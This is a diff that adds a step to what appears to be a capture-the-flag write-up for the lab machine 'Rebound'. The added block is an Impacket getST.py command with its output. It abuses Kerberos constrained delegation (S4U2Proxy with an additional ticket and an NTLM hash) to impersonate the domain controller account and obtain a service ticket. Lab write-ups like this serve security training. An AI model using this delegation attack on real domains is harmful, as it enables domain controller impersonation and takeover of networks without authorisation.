@@ -478,3 +478,16 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
 ```
 
+```python
+faketime -f +7h getST.py -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :aafb74ba2eb5e5ff7003a9a54ad1f904 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC01$
+[*] 	Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
+```
+
+
